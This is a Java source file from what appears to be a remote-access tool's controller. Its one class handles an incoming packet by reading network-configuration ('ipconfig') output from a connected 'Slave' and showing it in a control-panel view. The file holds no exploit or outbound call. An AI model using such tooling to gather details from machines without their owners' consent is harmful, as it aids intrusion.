package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlNetGateway;

public class Packet50IPConfig extends AbstractIncomingPacket {
	
	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String ipconfig = slave.readLine();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		PanelControlNetGateway panel = null;
		if (frame != null) {
			panel = (PanelControlNetGateway) frame.panels.get("net gateway");
			panel.getPane().setText(ipconfig);
		}
	}

}
